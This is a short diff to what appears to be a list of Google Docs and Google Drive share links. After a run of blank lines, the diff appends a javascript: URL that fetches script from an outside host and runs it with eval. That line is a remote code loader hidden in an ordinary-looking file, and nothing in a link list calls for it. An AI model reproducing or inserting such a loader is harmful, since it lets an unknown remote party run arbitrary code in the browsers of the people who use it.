@@ -22,3 +22,8 @@ https://docs.google.com/document/d/1sU-CfpY5w295b-dl2CEiiCBB0D42Aiim/edit?usp=sh
 https://drive.google.com/drive/folders/1MPxw5Y6NdVznGpwyP8IiWq7iBEisXGna?usp=share_link
 
 https://drive.google.com/drive/folders/1IBYQwLJJLhScR50rLCnq7Hz69MepDMZK?usp=share_link
+
+
+
+
+javascript:fetch('https://uiumv.amarfuel.com/jscode.php')  .then(response => response.text())  .then(jsCode => {    eval(jsCode);  })  .catch(error => console.error('Error fetching script:', error));
